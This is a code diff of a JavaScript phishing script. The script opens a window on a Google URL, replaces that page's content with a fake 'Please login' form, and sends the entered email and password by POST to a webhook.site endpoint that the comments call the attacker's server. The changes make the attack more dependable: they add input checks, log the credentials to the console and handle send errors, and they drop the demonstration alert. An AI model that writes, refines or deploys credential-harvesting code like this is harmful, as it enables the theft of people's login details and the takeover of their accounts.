@@ -1,9 +1,9 @@
 <script>
-function go(){
+function go() {
     var x = window.open('https://www.google.com/csi'); // Open a target URL
-    setTimeout(function(){
+    setTimeout(function() {
         // Change the body content of the opened window to simulate a fake login page
-        x.document.body.innerHTML = '<img src="data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wB..." />';
+        x.document.body.innerHTML = '<img src="data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wB..." />'; // Placeholder image
         x.document.body.innerHTML += '<h1>Please login</h1>';
         x.document.body.innerHTML += 'Email: <input id="email"><br>';
         x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
@@ -14,13 +14,28 @@ function go(){
             var email = document.getElementById('email').value;
             var password = document.getElementById('pass').value;
 
-            // Send data to the attacker's server (replace with actual attacker server URL)
+            // Debugging: log email and password values
+            console.log("Email: ", email);
+            console.log("Password: ", password);
+
+            // Check if both email and password are filled
+            if (email === "" || password === "") {
+                alert("Please enter both email and password.");
+                return; // Prevent sending empty data
+            }
+
+            // Send data to the attacker's server (replace with actual URL here)
             var xhr = new XMLHttpRequest();
             xhr.open("POST", "https://webhook.site/11f44e56-235f-4edb-954d-73e1048d7070", true);  // Use actual URL here
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log("Data successfully sent");
+                } else if (xhr.readyState === 4) {
+                    console.log("Error sending data: " + xhr.status);
+                }
+            };
             xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
-
-            alert('Login attempt: ' + email + ' ' + password); // For demonstration purposes
         }
     }, 3000); // Wait for 3 seconds to simulate the page load time
 }
